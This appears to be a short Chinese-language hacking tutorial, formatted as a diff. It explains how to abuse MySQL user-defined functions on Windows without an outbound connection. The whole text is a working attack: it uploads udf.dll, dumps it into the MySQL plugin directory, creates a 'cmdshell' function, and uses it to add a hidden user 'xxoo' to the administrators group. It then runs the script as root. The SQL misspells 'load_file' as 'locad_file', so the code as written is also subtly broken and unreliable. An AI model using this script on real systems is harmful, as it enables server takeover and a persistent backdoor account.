@@ -1,0 +1,16 @@
+
+不外连的情况下
+也是可以的
+给大家脚本和用法吧
+
+首先 将 udf.dll上传至某可写路径
+再将mysql.exe上传至一可执行目录
+写个sql文件文件内容如下:
+Use mysql;  
+Select locad_file("d:\\wwwroot\\wangba\\udf.dll")  into dumpfile 'f:\\databases\\mysql 5.1\\lib\\plugin\\xxoo.dll' ;  
+create function cmdshell returns string soname 'xxoo.dll';  
+select cmdshell('net user xxoo xxoo /add&net localgroup administrators xxoo /add');  
+drop function cmdshell; 
+
+然后执行cmd
+Mysql -uroot -pxxoo < c:\\temp\\xxoo.sql
